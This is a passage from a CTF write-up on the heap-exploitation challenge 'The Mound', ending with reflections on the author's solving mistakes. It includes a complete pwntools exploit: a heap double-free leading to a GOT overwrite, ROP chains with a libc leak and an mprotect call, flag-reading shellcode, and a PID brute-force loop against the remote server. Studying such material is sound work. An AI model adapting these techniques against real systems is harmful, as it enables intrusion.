add(midxs.mcache_dup, 0xe, fit(mound_data.mcache, mound_arena.mcache-0x10)) # overwrite ->next
add(midxs.mcache_dup, 0xd, 'hi')
add(midxs.mcache_dup, 0xc, fit(mound_data.mcache, context.binary.got['setvbuf'])) # overwrite .top
add(midxs.got_overwriter, 0xb, pack(context.binary.sym.win)) # overwrite got['scanf']

# win() will execute. Leak libc in the first cycle.
R = ROP(context.binary)
R.raw(0x48*b'a')
R.puts(context.binary.got['read'])
R.win()
r.sendlineafter(';)\n', R.chain())
context.libc.symbols['read'] = unpack(r.recvline()[:6], 'all')
# Using libc, change 0xbeef* to an rwx page, and jump to the shellcode that was allocated there earlier on.
R = ROP(context.libc)
R.raw(0x48*b'a')
R.mprotect(mound_data.base, 0x400000, 7)
R.call(mound_data.shellcode)
r.sendlineafter(';)\n', R.chain())
# get flag
print(r.recvall())
```

Locally, this works!

```c
[*] [libc] Running '/mound' with libs in '/libc-database/libs/libc6_2.31-0ubuntu9.1_amd64'!
[+] Starting local process '/libc-database/libs/libc6_2.31-0ubuntu9.1_amd64/ld-linux-x86-64.so.2': pid 10422
[*] Loaded 15 cached gadgets for 'mound'
[*] Loaded 201 cached gadgets for '/libc-database/db/libc6_2.31-0ubuntu9.1_amd64.so'
[+] Receiving all data: Done (100B)
[*] Stopped process '/libc-database/libs/libc6_2.31-0ubuntu9.1_amd64/ld-linux-x86-64.so.2' (pid 10422)
b'test{flag}\n.^J\xb5o\x00\x00\x00\x00\x00\x00\x00\x00\xc72\x89f\xe9O\xc1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

On remote, this is a little more difficult. Paying attention to these two local-specific lines:

```python
r = context.binary.process()
libc.srand(t^r.pid)
```

I need some method to guess the PID of the challenge on remote. Considering that the standard maximum PID number is `1<<15`, I decided to try my luck with bruteforcing it<sup>5</sup>, replacing the code above with,

```python
r = remote('193.57.159.27', 41932)
libc.srand(t^int(args.PID))
```

 And executing the following shell script:

```sh
for i in `seq 1 3 32768` # increment PID by 3 for every guess; internally in the docker container
do python3.8 mound.py PID="$i" # the PID increases by 2 for every connection, so this improves the guessing 
done | tee mound.log
```

It doesn't work the first time around, but I repeat the process to obtain the flag:

```sh
$ grep { *.log
mound2.log:b'rarctf{all0c4t0rs_d0_n0t_m1x_e45a1bf0b2}\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Segmentation fault\n'
```

And with that, I'm done with the technical stuff.

## Mistakes

[Content warning: unsubstantiated opinions]

### I. Pwn isn't RE

CTF pwn binaries are usually small enough to fully reverse engineer, and The Mound was no exception. But the reversing effort always arrives with the cost of Time. The entire section of this writeup dedicated to understanding [the heap implementation](#mound) was written _during_ the 36-hours between me starting this challenge and `mound.py` spitting out the flag. The assumption I've been rolling with, in all of the pwnables do, is that boosting `time(reversing binaries)` will pay off by a comparable reduction in `time(scripting and debugging)`.

That belief didn't work out for this challenge. At the end of the [`main()` reversing effort](#program-outline), I noted that I observed a few _Bad Things_ going on in the switch-cases. So I spent a thousand-or-so words reversing the interworkings of the `mound` to understand that sending a glibc pointer to `mfree()` tends to produce `Double free` `exit(1)` calls as a result of a null `prev_size`.

Do you know how else I could've discovered that? By just _testing out the damn thing_ and getting a backtrace:

```python
gdb.attach(r, gdbscript='b exit\nc')
strdup(b'hi', 0)
free(0)
r.interactive()
```

<p align="center">
<img src="image-20210809190804515.png">
</p>

<p align="center">
<img src="image-20210809190903079.png">
</p>

Oh, look! It stops in `find_id()`. Which only stops because `*((void*)p-0x10) == NULL` for the `p` in `mfree(p)`. So I should probably find a way to edit `prev_size` for one of the `strdup()`'d pointers.

Five minutes to figure out something I spent 5 hours in IDA Pro for. There are situations where a myopic focus on testing crashes might not work out, but _The Mound_ is certainly not one of them. I can't speak for ptr-yudai, but judging by his [long article](https://ptr-yudai.hatenablog.com/entry/2020/12/15/003822) on adapting fuzzing techniques for CTF pwnables, I expect that there's a lot more to gain from a lucid application of dynamic analysis than there is from my oddball approach of _eyeballing everything I can_ in IDA until something sticks.

I might re-evaluate this section if someone comes around with a _really fast_ CTF Reversing strategy, but until then:

### II. Pattern matching

CTF challenges are full of patterns and trends. When one popular CTF introduces a unique challenge, other CTFs tend to ape<sup>6</sup> after the original design. v8 challenges are a good example of this:

![](image-20210809192844264.png)

Prior to 2018, nothing. This year, there's already been 4+ CTFs with v8 challenges. Compare this with a graph of Chrome's market share:

![](image-20210809194840239.png)

The IRL relevance of v8 hasn't changed (much), so what gives?

There's a good comparison to be made between CTF trends and memetic reproduction. An established CTF comes up with an interesting challenge design. A decade or so ago, this might've been "Return Oriented Programming". Go back a few years and you'll see everyone interested in nifty `House of *` exploits. In the past few years, there's been an obsession with things like v8 oobs and `printf()` one-shots.

This is an intentionally broad picture; the trends I've listed here are cherry-picked obvious ones. There are smaller, less identifiable trends, and these weaker trends are a part of why I went down the weird exploit path I did for The Mound.

Instinctively, I try to pull meta-games using the trends I observe. If it's a v8 challenge, I try to get an oob JSArray, even though that kind of stuff is [a lot harder](https://bugs.chromium.org/p/v8/issues/detail?id=8806) with contemporary security measures. If there's a text input, I'll bash in `"A"*0x1000` for the sake of it. And if there's a [special number](https://github.com/IRS-Cybersec/ctfdump/blob/master/0ctf_quals%202021/listbook.md) that'll produce a [negative array index](https://github.com/IRS-Cybersec/ctfdump/blob/master/UIUCTF%202021/uiuctf.md) — a smaller pattern that I've unfortunately internalised — I'll do my best to shape my exploit into abusing it, even if I have to use more powerful primitives to get there.

It was with this bias that I approached _The Mound_, even after I learnt how to double-free a `mound` allocated chunk. I understood on a subconscious level that a double-free was almost certainly a more powerful tool than what I wanted to swing it around for (incrementing `mcache->counts[]`), but if it _follows what I've seen before_, I have an expectation that things will go the same way.

I'll admit that this is a little bit theoretical, but I would have saved a _lot_ of time if I could've just convinced myself to abort with the `mcache->entries[-1]` exploit path early on. I'm not exactly sure what I can do to prevent this kind of thing in the future, either. Something that deserves more thought.

### III. Things I haven't considered?

I could be doing pwn in sub-optimal ways I can't identify as sub-optimal on my own. I'm hoping that other writeups on this challenge (if they arrive) can provide the kind of external insight on how challenges can be solved faster.

That's it.

## Footnotes

1. This isn't particularly useful. There's no way to leak pointers outside of `win()`.

2. I tried looking for seeds that would produce repeated cycles:

   ```python
   from ctypes import CDLL
   LIBC = CDLL('libc.so.6')
   t = LIBC.time(0)
   t &= 0xffffffffffff0000
   for i in range(t,t+0xffff):
       LIBC.srand(i)
       seen = set(LIBC.rand() for j in range(0x1000))
       if len(seen) < 0xff0: print(i, len(seen))
   ```

   The script found nothing.

3. In case you're wondering how there's a pseudocode reference to `mound_arena.mcache->entries[]`, as opposed to an ugly red `*(_QWORD *)(MEMORY[0xDEAD0008008] + 8 * (v3 + 2LL) + 8)` reference:

   * Define the `mound_metadata` class (and the other `struct`s from [here](#mound)) in the `Structures` tab; you should see an entry like this in the local types tab (Shift+F1):
     ![](image-20210809082020677.png) 
   * In the IDA View tab, select `Edit --> Segments --> Create Segment`; fill the pop-up window with sensible values
   * put a variable at `mound_arena:00000DEAD0000000` and retype it (`Y`) as a `mound_metadata`.

4. The code block there isn't supposed to make sense. Throughout the writeup, I've tried to keep declarations and variables consistent across code snippets, but getting this code to match with everything else in the writeup is just a _little bit_ intractable.

5. This is the reason why I ended up searching for [the intended solution](#the-obvious-solution). My silly alternative method for getting to `win()` doesn't work on remote; the time cost associated with a single connection – let alone _bruteforcing the PID_ – makes it impossible to increment `mcache->entries[-1]` without an absurdly low ping.
   The 30x number comes from a crude measure of how many times the exploit calls `choose()`. For the intended solution, it's about a hundred. The negative indexing process takes around ~3000 calls on average, and this shakes out to an exploit duration of around 15 minutes _per guess_ on remote.
   Feel free to try it out youself:

   ```python
   from random import randint
   from collections import namedtuple
   from ctypes import CDLL
   from tqdm import tqdm
   from pwnscripts import *
   
   BEEF, DEAD = 0xbeef0000000, 0xdead0000000
   mound_arena = namedtuple('mound_metadata', 'base ids mcache top')(DEAD, DEAD+0x8, DEAD+0x8008, DEAD+0x8010)
   mound_data = namedtuple('beef', 'base mcache dents shellcode')(BEEF, BEEF+0x10, BEEF+0x10000, BEEF+0x100)
   midxs = namedtuple('midb', 'prev_size_editor fakeid_provider strdup mcache_dup got_overwriter')(5, 6, 0, 1, 2)
   
   context.binary = 'mound'
   context.libc = 'libc.so.6'
   libc = CDLL('libc.so.6')
   t = libc.time(0)
   if args.REMOTE:
       r = remote('193.57.159.27', 41932)
       #r = remote('localhost', 8329)
       libc.srand(t^int(args.PID)) # bruteforce PID
   else:
       r = context.binary.process()
       libc.srand(t^r.pid)
   
   # I/O methods
   def choose(opt: int): r.sendlineafter(b'> ', str(opt))
   def strdup(s: bytes, i: int):
       choose(1)
       r.sendafter(b'Pile: ', s)
       r.sendlineafter(b'index: ', str(i))
   def add(midx: int, idx: int, s: bytes):
       choose(2)
       sz = midx2rsize(midx)
       assert sz < 0x1000
       assert len(s) <= sz
       r.sendlineafter('pile: ', str(sz))
       r.sendlineafter('index: ', str(idx))
       r.sendafter('Pile: ', s)
   def edit(idx: int, s: bytes):
       choose(3)
       r.sendlineafter('index: ', str(idx))
       r.sendafter('pile: ', s)
   def free(idx: int):
       choose(4)
       r.sendlineafter('index: ', str(idx))
   
   def csize2midx(x:int): return (x>>4)-2
   def midx2csize(i:int): return (i+2)<<4
   def size2request(x:int): return x-0x10
   def request2size(x:int): return x+0x10
   def midx2rsize(i:int): return size2request(midx2csize(i))
   def r64bit(): return libc.rand()+(libc.rand()<<32) # emulate rand64bit
   def r64(): return randint(0, (1<<64)-1) # a separate, unrelated function to produce random numbers
   
   midxs = namedtuple('midb', 'first_alloc overflower incrementer fakechunk bugged got_overwriter entries')(1, 4, 0, 2, -1, 3, 0x10)
   mound_data = namedtuple('beef', 'base mcache fakechunk dents shellcode')(BEEF, BEEF+0x10, BEEF+0x100, BEEF+0x10000, BEEF+0x190)
   def fake_mcache_entry(sz: int, fd=0, rid=None, mcache=mound_data.mcache):
       if rid is None: rid = r64()
       return fit(rid, sz, mcache, fd)
   add(midxs.first_alloc, 0, fake_mcache_entry(sz=midx2csize(midxs.fakechunk)))
   add(midxs.overflower, 1, b'a') # chunk to be overflowed
   for _ in range(2): r64bit()
   
   O_DIRECTORY, FLAG_LEN = 0x10000, 100 # use reasonably long values here
   sc = '' # step 1: getting a directory listing
   sc+= shellcraft.pushstr('/pwn') # put "/pwn" on the stack
   sc+= shellcraft.openat(0, 'rsp', O_DIRECTORY) # use openat in lieu of open. rsp because of pushstr
   sc+= 'mov QWORD PTR [{}], rax\n'.format(mound_data.base) # Store the resultant fd _somewhere_ accessible (mound_data.base)
   sc+= shellcraft.getdents64('rax', mound_data.dents, 0x10000) # use getdents to list directory
   # step 2: loop through the dents data to find the flag filename
   sc+=shellcraft.mov('rax', mound_data.dents)
   sc+= 'loop:\n'
   sc+= 'inc rax\n'
   sc+= 'cmp DWORD PTR [rax], {}\n'.format(hex(u32('.txt')))
   sc+= 'jne loop\n'
   # step 3: open the flag file, read to _somewhere_ (mound_arena.base), and write to stdout
   sc+= 'lea rbx, [rax-0x20]\n'
   sc+= 'mov rax, QWORD PTR [{}]\n'.format(mound_data.base)
   sc+= shellcraft.openat('rax', 'rbx', 0)
   sc+= shellcraft.read('rax', mound_arena.base, FLAG_LEN)
   sc+= shellcraft.write(1, mound_arena.base, FLAG_LEN)
   sc = asm(sc) # don't call asm() twice
   add(1+csize2midx(request2size(len(sc))), 8, sc) # dump shellcode somewhere in mound_data for later use
   
   for _ in range(3): r64bit() # There have been 5 rand64bit() calls so far; account for them.
   
   # The substance of the exploit: getting mcache->entries[-1] to point to a fake mchunk
   for midx,b in tqdm((i+midxs.entries,b) for i,b in enumerate(pack(mound_data.fakechunk)) if b):
       def pad(s: bytes): return s.rjust(0x17, b'a')
       strdup(pad(b''), 0xf) # Remember that maximally, user_sz = 8 (mod 0x10) for a given glibc heap chunk.
       strdup(pad(b''), 0xe) # A string has a trailing nul-byte, so maximally strlen(s) = 7 (mod 0x10)
       add(midx, 2, b'hi')
       while (pred := r64bit())>>56: add(midx, 2, b'hi')
       for _ in range(b):
           free(2)
           edit(0xf, pad(pack(r64())[:7]))
           free(0xe)
           edit(0xf, pad(pack(pred)[:7]))
           add(midxs.incrementer, 5, b'a'*0x10)
   # , free it + a chunk right in front of it, overflow into the real freed chunk's metadata to
   add(midxs.bugged, 2, b'') # Get the fake chunk allocated,
   free(2) # free it + the chunk overlapping with the fake chunk
   free(1) # prepare to overwrite freed mchunk metadata such that ->next points to a fake chunk on the mound_arena
   add(midxs.fakechunk, 2, b'overwrite!'.ljust(0x10,b'a') + fake_mcache_entry(sz=999, fd=mound_arena.mcache-0x10))
   add(midxs.overflower, 1, 'hi') # put the fake mound_arena chunk on the mcache
   add(midxs.overflower, 1, fit(mound_data.mcache, context.binary.got['setvbuf'])) # replace mound_arena->top with the GOT
   add(midxs.got_overwriter, 2, pack(context.binary.sym.win)) # overwrite a good function with win() (I use scanf() here)
   
   # win() will execute. Leak libc in the first cycle.
   R = ROP(context.binary)
   R.raw(0x48*b'a')
   R.puts(context.binary.got['read'])
   R.win()
   r.sendlineafter(';)\n', R.chain())
   context.libc.symbols['read'] = unpack(r.recvline()[:6], 'all')
   # Using libc, change 0xbeef* to an rwx page, and jump to the shellcode that was allocated there earlier on.
   R = ROP(context.libc)
   R.raw(0x48*b'a')
   R.mprotect(mound_data.base, 0x400000, 7)
   R.call(mound_data.shellcode)
   r.sendlineafter(';)\n', R.chain())
   # get flag
   print(r.recvall())
   ```
   
6. This isn't meant as an attack against the 'originality' of CTF challenge makers. Good CTF challenge makers have to be CTF players themselves, and where else would you draw inspiration from, if not prior CTFs?

If any part of this writeup was interesting for you, try submitting a comment below; I've only just added utteranc.es to this site.
